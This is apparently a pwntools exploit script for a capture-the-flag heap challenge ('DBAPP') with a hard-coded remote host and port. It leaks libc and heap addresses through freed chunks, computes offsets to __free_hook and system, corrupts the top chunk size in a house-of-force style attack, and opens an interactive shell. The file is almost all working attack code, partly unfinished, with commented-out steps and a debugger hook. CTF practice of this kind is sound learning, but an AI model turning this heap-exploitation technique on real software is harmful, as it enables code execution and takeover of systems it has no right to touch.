# coding:utf-8
from pwn import *
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
LOCAL = 1
if LOCAL:
    io = process('./DBAPP')#,env={"LD_PRELOAD":"./libc-2.24.so"})
    elf = ELF('./DBAPP')
#    context.log_level = 'debug'
else:
    io = remote("39.107.33.43", 13570)

def z(a=''):
	gdb.attach(io,a)
	if a == '':
		raw_input()

def mmenu(choice):
    io.recvuntil("Your choice:")
    io.sendline(choice)

def Add(length,name):
    mmenu('2')
    io.recvuntil('Please enter the length of item name:')
    io.sendline(str(length))
    io.recvuntil('Please enter the name of item:')
    io.send(name)

def Show():
    mmenu('1')

def Delete(index):
    mmenu('4')
    io.recvuntil('Please enter the index of item:')
    io.sendline(str(index))

def Change(index,length,name):
    mmenu('3')
    io.recvuntil('Please enter the index of item:')
    io.sendline(str(index))
    io.recvuntil('Please enter the length of item name:')
    io.sendline(str(length))
    io.recvuntil('Please enter the new name of the item:')
    io.sendline(name)

Apps_addr = 0x00000000006020A8
system_libc = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
malloc_hook_libc = libc.symbols['__malloc_hook']

def pwnit():
	#leak libc_base and calc some useful addr
	Add(0x100,'/bin/sh\x00') #0
#	z()
	# payload = p64(0)*32
	# payload += p64(0) + p64(0x30000)#0x20cb1
	# print 0x20cb1



	# Change(0,len(payload) + 1,payload)
	# # io.interactive()
	# Add(0x20cb1,'AAAA') #1
	# io.interactive()
# 0xd99120:	0x0	0x0
# 0xd99130:	0x0	0x20ed1
	Add(0x100,'AAAA') #1
	Add(0x100,'AAAA') #2
	# z()

	Delete(1)

	Show()

	io.recvuntil('1 : ')
	data = u64(io.recv(6).ljust(8,'\x00'))
	success('data:'+hex(data))
#	z()
	libc_base = data - malloc_hook_libc - (0x7f43a522ab78 - 0x7f43a522ab10) #0x7f43a522ab10  0x7f43a522ab78 <main_arena+88>:	0x17e5350
	free_hook_addr = free_hook + libc_base
	system_addr = system_libc + libc_base
	success('free_hook_addr:'+hex(free_hook_addr))
	success('system_addr:'+hex(system_addr))

	Add(0x100,'AAAA') #3

	Add(0x20,'AAAA') #4
	Add(0x20,'AAAA') #5
	Delete(4)
	Delete(5)

	Show()

	io.recvuntil('5 : ')
	data = u64(io.recv(3).ljust(8,'\x00'))
	success('data:'+hex(data))#              0x6b8350:	0x0	0x31                 0x6b83b0:	0x0	0x20c51
	top_chunk = data + (0x6b83b0 - 0x6b8350)
	success('free@got:'+hex(elf.got['free']))
	success('top_chunk:'+hex(top_chunk))

	Add(0x20,'AAAA') #6
	Add(0x20,'AAAA') #7
	# io.interactive()
#	z()

	offset1 = elf.got['free'] - top_chunk - 0x10
	offset2 = free_hook_addr - top_chunk
	print offset2
	success('offset1:'+str(offset1))
	success('offset2:'+hex(offset2))

	Add(0x100,'AAAA') #8
	payload = p64(0)*32
	payload += p64(0) + p64(offset2 + 0x20)



	Change(8,len(payload) + 1,payload)
	# z()


#	Add(offset2,'aaaa')
#0x6020F8
	z()
	io.interactive()

    
if __name__ == "__main__":
    pwnit()